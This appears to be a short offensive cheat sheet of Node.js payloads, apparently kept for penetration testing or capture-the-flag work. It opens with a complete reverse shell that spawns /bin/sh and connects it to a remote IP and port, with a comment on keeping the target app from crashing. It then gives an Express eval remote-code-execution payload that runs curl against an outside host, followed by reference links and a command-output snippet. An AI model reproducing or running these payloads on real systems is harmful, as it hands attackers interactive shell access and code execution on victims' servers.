## NodeJS reverse shell

(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect(8080, "10.17.26.64", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/; // Prevents the Node.js application form crashing})();

## NODEJS/EXPRESS EVAL RCE  
require("child_process").exec('curl 192.168.49.109:443')  
can get direct output, see refs:  
https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44  
https://stackoverflow.com/questions/1880198/how-to-execute-shell-command-in-javascript  
- specifically https://stackoverflow.com/a/52575123  
const execSync = require('child_process').execSync;  
const output = execSync('ls -lah', { encoding: 'utf-8' });  
console.log('Output was:\n', output);  
https://nodejs.org/api/child_process.html